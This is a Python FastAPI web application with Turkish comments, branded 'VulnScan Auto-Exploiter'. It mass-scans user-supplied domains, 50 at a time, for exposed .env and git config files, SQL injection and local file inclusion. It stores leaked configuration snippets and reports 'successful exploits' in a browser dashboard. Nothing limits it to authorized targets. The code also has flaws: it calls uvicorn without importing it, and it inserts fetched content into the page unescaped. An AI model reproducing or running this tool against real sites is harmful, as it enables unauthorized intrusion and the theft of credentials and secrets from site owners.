from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
from typing import List

# --- RENDER İÇİN LOGLAMA VE DİZİN AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Auto-Exploiter - Render Edition")

# Kalıcı disk yolu
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

# --- VERİTABANI YÖNETİMİ ---
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS scans (id INTEGER PRIMARY KEY, domain TEXT, result TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      severity TEXT, evidence TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET CANLI LOG YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = self.format(record)
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                loop.create_task(manager.broadcast(log_entry))
        except Exception:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
logger.addHandler(ws_handler)

# --- ZAFİYET LİSTELERİ ---
COMMON_PATHS = ["/.env", "/.git/config", "/wp-config.php", "/config.php"]
SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini"]

# --- TEK BİR SİTEYİ TARAMA VE SÖMÜRME FONKSİYONU ---
async def scan_and_exploit(session, target_url):
    report = {
        "target": target_url,
        "vulnerabilities": [],
        "exploits": []
    }
    
    try:
        logger.info(f"Analiz başlatıldı: {target_url}")
        
        # 1. Temel HTTP Analizi ve Sunucu Tespiti
        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True) as response:
            server_header = response.headers.get("Server", "Bilinmiyor")
            powered_by = response.headers.get("X-Powered-By", "Bilinmiyor")
            
            if server_header != "Bilinmiyor":
                report["vulnerabilities"].append(f"Sunucu Bilgisi: {server_header} | PB: {powered_by}")
            
            if "Strict-Transport-Security" not in response.headers:
                report["vulnerabilities"].append("Eksik HSTS Başlığı")
            if "X-Frame-Options" not in response.headers:
                report["vulnerabilities"].append("Eksik X-Frame-Options (Clickjacking)")

        # 2. Gizli Dizin/Dosya Kontrolü
        for path in COMMON_PATHS:
            test_url = f"{target_url.rstrip('/')}{path}"
            async with session.get(test_url, timeout=3, ssl=False) as res:
                if res.status == 200:
                    text = await res.text()
                    if "404" not in text and "not found" not in text.lower():
                        report["vulnerabilities"].append(f"Açık Dizin/Dosya: {path}")
                        if path == "/.env" and "=" in text:
                            report["exploits"].append({"type": "Config Sızıntısı", "path": path, "evidence": text[:50] + "..."})
                            with get_db() as conn:
                                c = conn.cursor()
                                c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                             VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', 
                                          (target_url, "Config Sızıntısı", "CRITICAL", path))
                                conn.commit()

        # 3. SQL Injection Kontrolü
        for payload in SQLI_PAYLOADS:
            test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
            async with session.get(test_url, timeout=5, ssl=False) as res:
                text = (await res.text()).lower()
                for error in SQL_ERRORS:
                    if error in text:
                        report["exploits"].append({"type": "SQL Injection", "payload": payload, "evidence": error})
                        logger.critical(f"SQLi Tespit Edildi: {target_url}")
                        with get_db() as conn:
                            c = conn.cursor()
                            c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', 
                                      (target_url, "SQL Injection", "HIGH", error))
                            conn.commit()
                        break 

        # 4. LFI Kontrolü
        for payload in LFI_PAYLOADS:
            test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
            async with session.get(test_url, timeout=5, ssl=False) as res:
                text = await res.text()
                if "root:x:0:0" in text or "[extensions]" in text:
                    report["exploits"].append({"type": "LFI (File Inclusion)", "payload": payload, "evidence": "Sistem dosyası okundu!"})
                    logger.critical(f"LFI Tespit Edildi: {target_url}")
                    with get_db() as conn:
                        c = conn.cursor()
                        c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', 
                                  (target_url, "LFI", "CRITICAL", payload))
                        conn.commit()

    except Exception as e:
        report["error"] = str(e)
        logger.error(f"Hata: {target_url} - {str(e)}")
        
    return report

# --- TOPLU TARAMA API'Sİ ---
@app.post("/api/batch-scan")
async def batch_scan(domains: list[str]):
    # Render Pro için eşzamanlılık limiti artırıldı
    semaphore = asyncio.Semaphore(50)
    
    async def limited_scan(session, url):
        async with semaphore:
            if not url.startswith("http"):
                url = "http://" + url
            return await scan_and_exploit(session, url)

    async with aiohttp.ClientSession() as session:
        tasks = [limited_scan(session, url) for url in domains]
        results = await asyncio.gather(*tasks)
        
    return {"status": "success", "total_scanned": len(results), "results": results}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    html_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan | Auto-Exploiter</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
        <style>
            :root { --bg: #0b0f19; --card: #1a2235; --accent: #00ffcc; --danger: #ff3366; --warning: #ffcc00; --text: #e2e8f0; }
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
            body { background-color: var(--bg); color: var(--text); min-height: 100vh; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
            .header { text-align: center; margin-bottom: 30px; }
            .header h1 { font-size: 2.5rem; font-weight: 800; color: #fff; }
            .header h1 span { color: var(--danger); }
            .search-box { width: 100%; max-width: 800px; background: var(--card); padding: 20px; border-radius: 12px; display: flex; flex-direction: column; gap: 15px; border: 1px solid #2d3748; }
            textarea { width: 100%; height: 100px; background: #0b0f19; color: white; border: 1px solid #334155; padding: 15px; border-radius: 8px; font-family: monospace; resize: vertical; }
            button { background: var(--danger); color: #fff; border: none; padding: 15px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 1.1rem; transition: 0.2s; }
            button:hover { box-shadow: 0 0 15px rgba(255, 51, 102, 0.5); }
            button:disabled { background: #475569; cursor: not-allowed; }
            #loader { display: none; margin-top: 30px; color: var(--danger); font-weight: 600; font-size: 1.2rem; animation: pulse 1.5s infinite; }
            @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
            .results-container { width: 100%; max-width: 1000px; margin-top: 30px; display: none; }
            .site-card { background: var(--card); border: 1px solid #2d3748; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
            .site-header { font-size: 1.2rem; font-weight: 600; color: var(--accent); border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; }
            .vuln-list { list-style: none; margin-bottom: 15px; }
            .vuln-item { color: var(--warning); font-size: 0.9rem; padding: 5px 0; }
            .exploit-box { background: rgba(255, 51, 102, 0.1); border-left: 4px solid var(--danger); padding: 15px; border-radius: 4px; margin-top: 10px; }
            .exploit-title { color: var(--danger); font-weight: bold; margin-bottom: 5px; }
            .exploit-desc { color: #ffb3c6; font-size: 0.9rem; font-family: monospace; }
            #log-terminal { width: 100%; max-width: 1000px; height: 150px; background: #000; color: #00ffcc; font-family: monospace; font-size: 0.85rem; padding: 10px; margin-top: 20px; overflow-y: scroll; border: 1px solid #334155; border-radius: 8px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>VulnScan <span>Auto-Exploiter</span></h1>
            <p>Toplu Hedef Tarama ve Akıllı Sömürü Motoru (Render Pro)</p>
        </div>

        <div class="search-box">
            <p style="color:#94a3b8; font-size:0.9rem;">Taramak istediğiniz hedefleri (URL veya IP) alt alta girin:</p>
            <textarea id="targetsInput" placeholder="http://testphp.vulnweb.com&#10;http://demo.testfire.net">http://testphp.vulnweb.com
http://demo.testfire.net</textarea>
            <button onclick="startBatchScan()" id="scanBtn">Toplu Taramayı Başlat</button>
        </div>

        <div id="loader">Hedefler analiz ediliyor ve uygun sömürüler uygulanıyor...</div>
        <div id="results" class="results-container"></div>
        
        <div id="log-terminal"><strong>[SİSTEM LOGLARI - CANLI]</strong><br></div>

        <script>
            // WebSocket bağlantısı (wss Render için zorunludur)
            var protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            var ws = new WebSocket(protocol + window.location.host + "/ws");
            
            ws.onmessage = function(event) {
                var terminal = document.getElementById("log-terminal");
                var line = document.createElement("div");
                line.innerText = "> " + event.data;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
            };

            async function startBatchScan() {
                const rawInput = document.getElementById('targetsInput').value;
                const domains = rawInput.split('\\n').map(d => d.trim()).filter(d => d);
                if(domains.length === 0) return alert("Hedef girin!");
                
                const btn = document.getElementById('scanBtn');
                const loader = document.getElementById('loader');
                const results = document.getElementById('results');
                
                btn.disabled = true; loader.style.display = "block"; results.style.display = "none"; results.innerHTML = "";

                try {
                    const response = await fetch('/api/batch-scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(domains)
                    });
                    const data = await response.json();
                    
                    loader.style.display = "none"; btn.disabled = false; results.style.display = "block";

                    data.results.forEach(site => {
                        let exploitsHtml = "";
                        if(site.exploits && site.exploits.length > 0) {
                            site.exploits.forEach(exp => {
                                exploitsHtml += `
                                    <div class="exploit-box">
                                        <div class="exploit-title">🚨 Sömürü Başarılı: ${exp.type}</div>
                                        <div class="exploit-desc">Payload: ${exp.payload || exp.path} <br> Kanıt: ${exp.evidence}</div>
                                    </div>
                                `;
                            });
                        } else {
                            exploitsHtml = "<p style='color:var(--accent); font-size:0.9rem;'>✅ Bilinen bir zafiyet sömürülemedi.</p>";
                        }

                        let vulnsHtml = "";
                        if(site.vulnerabilities && site.vulnerabilities.length > 0) {
                            vulnsHtml = "<ul class='vuln-list'>" + site.vulnerabilities.map(v => `<li class='vuln-item'>⚠️ ${v}</li>`).join('') + "</ul>";
                        }

                        results.innerHTML += `
                            <div class="site-card">
                                <div class="site-header">🌐 ${site.target} ${site.error ? '<span style="color:var(--danger);font-size:0.8rem;">(Erişilemedi)</span>' : ''}</div>
                                ${vulnsHtml}
                                ${exploitsHtml}
                            </div>
                        `;
                    });

                } catch (error) {
                    loader.style.display = "none"; btn.disabled = false; alert("Hata: " + error);
                }
            }
        </script>
    </body>
    </html>
    """
    return html_content

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
